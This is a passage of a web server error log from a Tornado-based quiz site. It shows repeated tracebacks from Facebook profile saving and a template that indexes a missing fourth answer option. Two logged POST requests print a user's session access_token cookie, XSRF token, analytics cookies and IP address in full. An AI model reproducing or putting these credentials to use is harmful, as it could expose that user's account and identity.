  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505a30dc8e4c854802b2dbc7&answers=%5B3%5D&cursor=10&_xsrf=616a3b3631694f7d879feb0ca575b028', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '94.175.8.64', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348083489|00873ae896e76ee86a2b7ad329c858b25e9e1371"; _xsrf=616a3b3631694f7d879feb0ca575b028; __utma=188782963.189299831.1348083425.1348083425.1348088023.2; __utmb=188782963.1.10.1348088023; __utmc=188782963; __utmz=188782963.1348083425.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 125.39ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505a30dc8e4c854802b2dbc7&answers=%5B3%5D&cursor=10&_xsrf=616a3b3631694f7d879feb0ca575b028', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '94.175.8.64', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348083489|00873ae896e76ee86a2b7ad329c858b25e9e1371"; _xsrf=616a3b3631694f7d879feb0ca575b028; __utma=188782963.189299831.1348083425.1348083425.1348088023.2; __utmb=188782963.1.10.1348088023; __utmc=188782963; __utmz=188782963.1348083425.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 106.89ms
WARNING:root:404 GET /phpmyadmin/translators.html (127.0.0.1) 0.73ms
WARNING:root:405 HEAD / (127.0.0.1) 0.72ms
WARNING:root:405 HEAD / (127.0.0.1) 1.02ms
WARNING:root:405 HEAD / (127.0.0.1) 0.68ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
